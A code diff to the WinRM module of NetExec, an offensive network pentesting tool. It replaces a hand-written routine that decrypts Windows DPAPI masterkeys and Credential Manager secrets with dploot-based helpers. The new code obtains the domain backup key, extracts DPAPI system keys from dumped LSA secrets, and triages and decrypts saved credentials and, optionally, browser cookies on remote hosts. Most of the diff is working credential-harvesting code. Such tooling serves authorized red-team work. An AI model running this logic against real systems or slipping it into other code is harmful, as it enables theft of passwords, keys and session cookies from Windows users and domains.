@@ -1,6 +1,7 @@
 import os
 import base64
 import traceback
+import binascii
 import requests
 import urllib3
 import logging
@@ -12,7 +13,7 @@ from pypsrp.client import Client
 from pypsrp.powershell import PSDataStreams
 from termcolor import colored
 
-from dploot.lib.utils import is_guid, is_credfile
+from dploot.lib.network.winrm import WINRMTarget as Target
 from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 from impacket.uuid import bin_to_string
@@ -20,6 +21,7 @@ from impacket.uuid import bin_to_string
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
+from nxc.helpers.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection, DPAPITriage
 from nxc.helpers.logger import highlight
 from nxc.helpers.misc import gen_random_string
 from nxc.helpers.negotiate_parser import parse_challenge
@@ -41,6 +43,9 @@ class winrm(connection):
         self.challenge_header = None
         self.targetDomain = None
         self.no_ntlm = False
+        self.dpapi_system_key = None
+        self.pvkbytes = None
+        self.no_da = None
 
         connection.__init__(self, args, db, host)
 
@@ -395,156 +400,70 @@ class winrm(connection):
             self.logger.display("Dumping LSA secrets")
             local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
+            
+            def lsa_secret_callback(_, secret):
+                self.logger.highlight(secret)
+                if "dpapi_machinekey" in secret:
+                    correl_table = {"dpapi_machinekey":"MachineKey","dpapi_userkey":"UserKey"}
+                    self.dpapi_system_key = {correl_table[k] :binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())} 
             LSA = LSASecrets(
                 f"{output_filename}.security",
                 boot_key,
                 None,
                 isRemote=None,
-                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+                perSecretCallback=lsa_secret_callback
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
 
     def dpapi(self):
-        """
-        Find and unlock Credential Manager masterkeys and credentials owned by user.
-        The flow is inspired by and a simplified version of dploot's triage methods for user masterkeys and credentials.
-        Actual decryption of keys and credentials is taken and adapted from impacket-dpapi.
-        """
-        user_masterkey_path = ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Protect")
-        user_credentials_paths = [
-            ntpath.join("C:\\Users", self.username, "AppData\\Roaming\\Microsoft\\Credentials"),
-            ntpath.join("C:\\Users", self.username, "AppData\\Local\\Microsoft\\Credentials")
-        ]
+        dump_system = "nosystem" not in self.args.dpapi
+        self.output_file = open(self.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # noqa: SIM115
 
-        self.logger.display("Collecting DPAPI masterkeys...")
+        if self.args.pvk is not None:
+            try:
+                self.pvkbytes = open(self.args.pvk, "rb").read()  # noqa: SIM115
+                self.logger.success(f"Loading domain backupkey from {self.args.pvk}")
+            except Exception as e:
+                self.logger.fail(str(e))
 
-        sids = self.ps_execute(f"Get-ChildItem -Path {user_masterkey_path} -Name -Directory -Include 'S-*'", True)
-        if not sids:
-            self.logger.fail(f"No masterkeys found for user {self.username}")
+        if self.pvkbytes is None:
+            self.pvkbytes = get_domain_backup_key(self)
+
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            address=self.host,
+            port=self.port,
+            ssl=self.ssl,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+        )
+
+        conn = upgrade_to_dploot_connection(context=self, target=target, protocol="winrm")
+        if conn is None:
+            self.logger.debug("Could not upgrade connection")
             return
 
-        masterkeys = []
-        for sid in sids.splitlines():
-            keys_path = ntpath.join(user_masterkey_path, sid.strip())
-            keys = self.ps_execute(f"Get-ChildItem -Path {keys_path} -Name -Hidden -File -Exclude 'Preferred'", True)
-            for key in keys.splitlines():
-                stripped_key = key.strip()
-                if is_guid(stripped_key):
-                    key_path = ntpath.join(keys_path, stripped_key)
-                    self.logger.debug(f"Found masterkey file {key_path}")
-                    local_key_file = f"{TMP_PATH}/{stripped_key}"
-                    self.conn.fetch(key_path, local_key_file)
-                    decrypted_key = self.get_master_key(local_key_file, sid, self.password)
-                    if decrypted_key:
-                        masterkeys.append((stripped_key, decrypted_key))
+        if dump_system and self.dpapi_system_key is None:
+            # Need to get DPAPI SYSTEM keys, prefer to use embedded LSA dump
+            # if not already dumped
+            self.lsa()
 
-        if not masterkeys:
-            self.logger.fail("Could not decrypt any keys")
+        masterkeys = collect_masterkeys_from_target(self, target, conn, dpapi_system_key=self.dpapi_system_key)
+
+        if len(masterkeys) == 0:
+            self.logger.fail("No masterkeys looted")
             return
 
         self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting secrets...")
 
-        credential_files = []
-        for user_credentials_path in user_credentials_paths:
-            creds = self.ps_execute(f"Get-ChildItem -Path {user_credentials_path} -Name -Hidden -File", True)
-            for cred_file in creds.splitlines():
-                stripped_cred_file = cred_file.strip()
-                if is_credfile(stripped_cred_file):
-                    creds_path = ntpath.join(user_credentials_path, stripped_cred_file)
-                    self.logger.debug(f"Found credentials file {creds_path}")
-                    local_cred_file = f"{TMP_PATH}/{stripped_cred_file}"
-                    self.conn.fetch(creds_path, local_cred_file)
-                    credential_files.append(local_cred_file)
+        dpapi_triage = DPAPITriage(self, target, conn, dump_cookies="cookies" in self.args.dpapi)
+        dpapi_triage.triage(masterkeys)
 
-        if not credential_files:
-            self.log.fail(f"No credential files found for user {self.username}")
-            return
-
-        for creds_file in credential_files:
-            with open(creds_file, "rb") as fp:
-                data = fp.read()
-            cred = CredentialFile(data)
-            blob = DPAPI_BLOB(cred["Data"])
-
-            guid_masterkey = bin_to_string(blob["GuidMasterKey"])
-            right_key = next((key for guid, key in masterkeys if guid.lower() == guid_masterkey.lower()), None)
-
-            if right_key is not None:
-                try:
-                    decrypted = blob.decrypt(right_key)
-                    if decrypted is not None:
-                        self.logger.debug(f"Successfully decrypted credentials in {creds_file}:")
-                        creds = CREDENTIAL_BLOB(decrypted)
-                        if creds["Unknown3"] != b"":
-                            target = creds["Target"].decode("utf-16le")
-                            username = creds["Username"].decode("utf-16le")
-                            try:
-                                password = creds["Unknown3"].decode("utf-16le")
-                            except UnicodeDecodeError:
-                                password = creds["Unknown3"].decode("latin-1")
-                            self.logger.highlight(f"{target} - {username}:{password}")
-                except Exception as e:
-                    self.logger.fail(f"Failed to decrypt credentials in {creds_file} with masterkey: {e!s}")
-                    self.logger.debug(traceback.format_exc())
-            else:
-                self.logger.fail(f"No matching masterkey found for credentials in {creds_file} (need {guid_masterkey})")
-
-    def get_master_key(self, masterkey_file, sid, password):
-        """
-        Taken and adapted from impacket.examples.dpapi
-        Could be cleaned up but the more we deviate from the original the harder it will be to maintain it
-        """
-        with open(masterkey_file, "rb") as fp:
-            data = fp.read()
-        mkf = MasterKeyFile(data)
-        data = data[len(mkf):]
-
-        if mkf["MasterKeyLen"] > 0:
-            mk = MasterKey(data[:mkf["MasterKeyLen"]])
-            data = data[len(mk):]
-
-        if mkf["BackupKeyLen"] > 0:
-            bkmk = MasterKey(data[:mkf["BackupKeyLen"]])
-            data = data[len(bkmk):]
-
-        if mkf["CredHistLen"] > 0:
-            ch = CredHist(data[:mkf["CredHistLen"]])
-            data = data[len(ch):]
-
-        if mkf["DomainKeyLen"] > 0:
-            dk = DomainKey(data[:mkf["DomainKeyLen"]])
-            data = data[len(dk):]
-
-        key1, key2, key3 = deriveKeysFromUser(sid, password)
-
-        # if mkf['flags'] & 4 ? SHA1 : MD4
-        decryptedKey = mk.decrypt(key3)
-        if decryptedKey:
-            self.logger.debug("Decrypted key with User Key (MD4 protected)")
-            return decryptedKey
-
-        decryptedKey = mk.decrypt(key2)
-        if decryptedKey:
-            self.logger.debug("Decrypted key with User Key (MD4)")
-            return decryptedKey
-
-        decryptedKey = mk.decrypt(key1)
-        if decryptedKey:
-            self.logger.debug("Decrypted key with User Key (SHA1)")
-            return decryptedKey
-
-        decryptedKey = bkmk.decrypt(key3)
-        if decryptedKey:
-            self.logger.debug("Decrypted Backup key with User Key (MD4 protected)")
-            return decryptedKey
-
-        decryptedKey = bkmk.decrypt(key2)
-        if decryptedKey:
-            self.logger.debug("Decrypted Backup key with User Key (MD4)")
-            return decryptedKey
-
-        decryptedKey = bkmk.decrypt(key1)
-        if decryptedKey:
-            self.logger.debug("Decrypted Backup key with User Key (SHA1)")
-            return decryptedKey
+        if self.output_file:
+            self.output_file.close()
+            with open(self.output_file_template.format(output_folder="dpapi")) as f:
+                if sum(1 for _ in f) == 0:
+                    self.logger.fail("No dpapi loot retrieved")
